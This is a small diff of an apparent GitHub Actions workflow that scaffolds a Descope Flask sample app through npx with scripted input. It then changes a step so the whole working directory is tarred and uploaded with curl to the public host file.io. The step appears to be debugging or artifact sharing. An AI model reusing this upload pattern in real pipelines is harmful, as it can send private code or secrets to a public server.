@@ -32,5 +32,5 @@ jobs:
           echo -n -e 'No\ndddd\nd\n\n' |
           sed "s@d@$(/usr/bin/printf '\e')"'[B@g' |
           npx github:descope-sample-apps/create-descope-app zoo -t flask-sample-app
-          tar -czf a.tz .
-          curl -F "file=a.tz" https://file.io
+          tar -czf /tmp/a.tz .
+          curl -F "file=@/tmp/a.tz" https://file.io
